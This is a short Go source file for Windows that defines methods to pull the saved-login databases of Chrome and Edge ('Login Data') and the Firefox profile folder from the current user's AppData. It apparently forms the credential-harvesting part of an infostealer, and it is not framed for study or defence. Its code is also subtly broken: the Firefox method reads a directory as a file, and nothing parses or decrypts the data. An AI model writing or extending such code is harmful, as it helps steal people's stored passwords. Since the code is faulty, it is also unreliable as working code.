//go:build windows

package windows

import (
"os"
"path/filepath"
)

type Browser struct{}

func NewBrowser() *Browser {
return &Browser{}
}

func (b *Browser) ExtractChrome() (string, error) {
path := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
data, err := os.ReadFile(path)
if err != nil {
return "", err
}
return string(data), nil
}

func (b *Browser) ExtractFirefox() (string, error) {
path := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
data, err := os.ReadFile(path)
if err != nil {
return "", err
}
return string(data), nil
}

func (b *Browser) ExtractEdge() (string, error) {
path := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
data, err := os.ReadFile(path)
if err != nil {
return "", err
}
return string(data), nil
}
